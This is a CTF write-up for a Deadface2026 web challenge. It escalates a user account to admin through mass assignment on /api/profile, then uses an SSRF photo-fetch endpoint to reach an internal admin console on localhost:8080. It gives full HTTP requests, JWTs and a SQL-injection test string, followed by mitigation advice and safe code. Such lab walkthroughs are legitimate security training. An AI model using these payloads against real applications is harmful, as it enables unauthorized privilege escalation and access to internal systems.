# Deadface2026

# I Want to be a Real Boy (4 of 4 series)

## Web: SSRF, Improper Access Control, Mass Assignment

## Description
Created By: @RP-01?
When it comes to a web application, the admin is king. We have already discovered so much data, do you think we can become an admin as well?
NOTE: This IP address is hosting other ports for other challenges, only the website is relevant to this challenge.
NOTE: Do not perform port scanning on this host, only the address and port discovered in OSINT matter.
Submit the flag as: deadface{flag-text}

http://45.79.200.170:3000/

## Files
> This challenge did not provide any files — only the description above.

---

## Analysis

We start at a login page that displays an explicit anti-bruteforce warning:

<img width="867" height="700" alt="login" src="https://github.com/user-attachments/assets/1e17d564-d610-40c9-86d4-a8cdaee69fbd" />


Testing a classic SQL injection payload in the `username` field (`admin' OR 1=1 --`) returns an HTTP 200 with no session token, but the JSON body leaks far more than the frontend ever renders:

```json
{
  "message": "Login failed. That's weird... check the network traffic!",
  "username": "john.smith",
  "name": "John Smith",
  "role": "user",
  "departmentid": 10685,
  "password": "Locked_In_And_Ready",
  "flag": "deadface{typical_and_classic}"
}
```

This is a hardcoded decoy response tied to challenge 1 of the series (`deadface{typical_and_classic}`) — it is not real SQL injection against the database (every malformed SQLi-looking payload returns this exact same body, same `ETag`, regardless of the actual injection attempted). Its real purpose is narrative: it leaks valid credentials (`john.smith` / `Locked_In_And_Ready`) for the legitimate user we'll use in this challenge.

Logging in normally with those credentials drops us into a dashboard showing PHI (Protected Health Information) for members of our own department, plus a second panel at the bottom:

> **Admin Tools — Member Photo Importer**
> *"Administrator access required."*

Viewing the page source reveals an HTML comment confirming the panel is enforced server-side, not just hidden in the UI:

```html
<!-- Admin tools (UI shown to all signed-in users; the server enforces admin) -->
```

This panel POSTs a user-supplied URL to `/api/admin/fetch-photo` — a textbook **SSRF** sink. As a `role: user`, the endpoint correctly returns `403 Forbidden` ("Role admin is required"). So the real objective of this challenge isn't the SSRF itself — it's **getting admin privileges first**.

---

## Theory

To solve this challenge you need to understand:

- **JWT (JSON Web Tokens)** — structure (header.payload.signature), how role claims are carried, and that a *validly signed* token isn't automatically a *safe* token if the server trusted bad input when issuing it
- **Mass Assignment (CWE-915)** — blindly binding client-supplied JSON fields to a server-side object/model without a field whitelist, allowing privileged fields (like `role`) to be set by an unprivileged client
- **Broken Access Control** — a UI element being hidden or "removed" does not mean the underlying API endpoint stops enforcing (or fails to enforce) authorization server-side
- **SSRF (Server-Side Request Forgery)** — abusing a server-side feature that fetches a URL on the attacker's behalf to reach internal-only network interfaces

---

## Solution

### Step 1: Finding the hidden self-service endpoint

Another HTML comment on the dashboard page caught our attention:

```html
<!-- Account self-service removed: profile is read-only -->
```

This is the real hint of the challenge. "Removed" refers to the *UI* — a frontend decision — but it does not guarantee the backend route was also decommissioned. Following standard REST naming conventions, `/api/profile` was a reasonable candidate. Probing it with a dummy Bearer token confirmed the route exists:

```
POST /api/profile → 401 "Invalid or expired token"   (route exists, just unauthenticated)
PUT  /api/account  → 404 "Cannot PUT /api/account"    (route does not exist)
```

The distinction between a `401` and a `404` here is what confirms a live endpoint versus a guess that missed.

### Step 2: Mass Assignment → Privilege Escalation

Sending a valid `john.smith` JWT to `/api/profile` with a body containing an unexpected field:

```http
POST /api/profile HTTP/1.1
Host: 45.79.200.170:3000
Content-Length: 16
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqb2huLnNtaXRoIiwibmFtZSI6IkpvaG4gU21pdGgiLCJyb2xlIjoidXNlciIsImRlcGFydG1lbnRpZCI6MTA2ODUsImlhdCI6MTc5MjM1NjE2MywiZXhwIjoxNzkyMzYzMzYzfQ.LpthtwGV0P10ksiRtL_YvMsKN7VyAbjo4Whsf4_VZfM
Content-Type: application/json
Accept: */*
Origin: http://45.79.200.170:3000
Referer: http://45.79.200.170:3000/dashboard
Connection: keep-alive

{"role":"admin"}
```

The server accepted the field at face value — no whitelist, no server-side authorization check on who's allowed to set `role` — and responded with a **freshly, legitimately signed** JWT reflecting the new privilege level:

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 356

{"message":"Profile updated.","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiJqb2huLnNtaXRoIiwiZGVwYXJ0bWVudGlkIjoxMDY4NSwibmFtZSI6IkpvaG4gU21pdGgiLCJpYXQiOjE3OTIzNjI3OTUsImV4cCI6MTc5MjM2MzY5NX0.iDA6ZRzaV9yW7vIFaRtpjNJhxPCRtQZ5qpd-Y9YPPEk","profile":{"role":"admin","sub":"john.smith","departmentid":10685,"name":"John Smith"}}
```

Important distinction for anyone replicating this: the JWT secret was never cracked, and `alg:none` does not work against this server (signature verification is correctly enforced). The vulnerability is entirely server-side logic — the application itself issued a valid, correctly-signed token because it trusted an unauthorized field in the request body. This is **Mass Assignment leading to Privilege Escalation**, not a JWT implementation flaw.

We confirmed the new token worked by repeating the `/api/admin/fetch-photo` request against our own host (`http://localhost:3000/`), which returned the application's own login page — proving the server performs the fetch **server-side**, and that our token now bypasses the `role:admin` check.

### Step 3: Identifying the internal port

The challenge description explicitly forbids port scanning the host ("only the address and port discovered in OSINT matter"), so instead of running a scanner we tried a short, reasoned list of common internal/web ports by hand: `3001`, `50000`, `443`, `80`, and `8080` — ports likely to be running an internal web server. `8080` was the one that returned content.

### Step 4: SSRF against the internal admin console

With the admin-privileged token, we sent the SSRF payload at the identified internal port:

```http
POST /api/admin/fetch-photo HTTP/1.1
Host: 45.79.200.170:3000
Content-Length: 31
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiJqb2huLnNtaXRoIiwiZGVwYXJ0bWVudGlkIjoxMDY4NSwibmFtZSI6IkpvaG4gU21pdGgiLCJpYXQiOjE3OTIzNjI3OTUsImV4cCI6MTc5MjM2MzY5NX0.iDA6ZRzaV9yW7vIFaRtpjNJhxPCRtQZ5qpd-Y9YPPEk
Content-Type: application/json
Accept: */*
Origin: http://45.79.200.170:3000
Referer: http://45.79.200.170:3000/
Connection: keep-alive

{"url":"http://localhost:8080"}
```

The response confirmed the request reached a service that is otherwise unreachable from the public internet:

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 698

<!doctype html>
<html><head><meta charset="utf-8"><title>HealthSpark :: Internal Admin Console</title></head>
<body style="font-family:monospace;background:#0c1320;color:#cfe3ff;padding:28px">
  <h1>HealthSpark — Internal Admin Console</h1>
  <p>RESTRICTED. This service is bound to the internal interface and is not
     exposed to the public network.</p>
  <hr>
  <h2>System status</h2>
  <ul>
    <li>node: prod-01</li>
    <li>uptime: nominal</li>
    <li>scheduled job: nightly eligibility export</li>
  </ul>
  <h2>Operator note</h2>
  <pre>If you can read this, the request reached us from the application server.
admin_console_token: deadface{oh_you_shouldnt_be_here}</pre>
</body></html>
```

**MACHINE PWNED!** :)

<img width="2152" height="1168" alt="flag" src="https://github.com/user-attachments/assets/518bdf75-e292-4743-905b-0e037529aea9" />


---

## Flag
> **deadface{oh_you_shouldnt_be_here}**

---

## How to Avoid

This challenge chains two distinct, very common real-world vulnerability classes. Both have well-known, well-documented mitigations:

### 1. Mass Assignment / Improper Authorization on Object Properties (CWE-915)

- **Never bind the raw request body directly to a data model.** Explicitly whitelist which fields a given endpoint is allowed to update (e.g., `name`, `email`) and silently drop or reject anything else (`role`, `departmentid`, `isAdmin`, etc.).
- Privileged fields like `role` should only ever be mutable through a separate, properly-authorized admin-only code path — never through a generic "update my profile" endpoint.
- Deprecating a feature in the frontend is **not** a security control. If an endpoint is no longer meant to be used, it must be removed, disabled, or re-gated server-side — not just unlinked from the UI.
- Apply the principle of least privilege to deserialization: frameworks like Mongoose, Sequelize, or raw `Object.assign(user, req.body)` patterns in Express are common sources of this exact bug.

### 2. Server-Side Request Forgery (SSRF)

- Any feature that fetches a URL supplied (even indirectly) by a user is a potential SSRF sink. Treat "fetch this image/file for me" features as attacker-controlled network pivots.
- Enforce strict allow-lists for outbound destinations (scheme, host, port) rather than deny-lists — deny-lists for `localhost`, `127.0.0.1`, `169.254.169.254`, etc., are trivially bypassed (decimal IP notation, `[::1]`, DNS rebinding, redirects).
- Internal services should not implicitly trust requests just because they originate from the application server's own network namespace — defense in depth means internal admin consoles should still require their own authentication, even when "nobody from the outside can reach them directly."
- Segment internal management interfaces onto networks/ports that are not reachable even by the public-facing application tier unless explicitly required, and log/alert on outbound requests to internal address ranges from application servers.

### Example: Minimal safe profile-update pattern (Node.js / Express)

```javascript
const ALLOWED_PROFILE_FIELDS = ["name", "email"];

app.post("/api/profile", authenticate, (req, res) => {
  const updates = {};
  for (const field of ALLOWED_PROFILE_FIELDS) {
    if (field in req.body) updates[field] = req.body[field];
  }
  // role, departmentid, isAdmin, etc. are NEVER taken from client input here
  Object.assign(req.user, updates);
  const token = signJwt(req.user); // role comes only from the persisted, trusted record
  res.json({ message: "Profile updated.", token });
});
```

### References

- [OWASP — Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [OWASP — Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf)

---

> **Author:** Jose Antonio Villafaña Montes de Oca
